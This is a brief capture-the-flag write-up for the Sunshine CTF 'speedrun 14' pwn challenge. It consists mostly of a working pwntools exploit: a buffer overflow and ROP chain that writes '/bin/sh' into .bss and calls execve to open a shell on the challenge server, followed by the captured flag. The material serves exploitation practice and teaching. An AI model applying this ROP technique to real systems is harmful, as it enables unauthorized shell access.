## Sunshine CTF: speedrun 14 [pwn]

#### Just an exploit script to be used as reference for later. Use it when planning to do a ropchain to call execve('/bin/sh'). Find a write (mov reg, reg) register so that you can write '/bin/sh' into the .bss section for easy access as it isn't affected by PIE.

```python
from pwn import *

#:
#p = process('./chall_14')
#binary = ELF('chall_14', checksec = False)
#gdb.attach(p.pid, 'break *main + 63')
p = remote('chal.2020.sunshinectf.org', 30014)
p.sendline('test')

pop_rax = 0x00000000004158f4
pop_rdx = 0x0000000000449b15
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410263
ret = 0x0000000000400416
syscall = 0x000000000040120c
mov_rax_rdx = 0x000000000048d1e1

bss_address = 0x6bb2e0

#: move binsh to bss
exploit = cyclic(104)
exploit += p64(ret)
exploit += p64(pop_rdx)
exploit += p64(0x0068732f6e69622f)
exploit += p64(pop_rax)
exploit += p64(bss_address)
exploit += p64(mov_rax_rdx)

#: setup syscall
exploit += p64(pop_rsi)
exploit += p64(0x0)
exploit += p64(pop_rdx)
exploit += p64(0x0)
exploit += p64(pop_rdi)
exploit += p64(bss_address)
exploit += p64(pop_rax)
exploit += p64(59)
exploit += p64(syscall)
p.sendline(exploit)
p.interactive()

#: sun{hail-to-the-king-c24f18e818fb4986}
```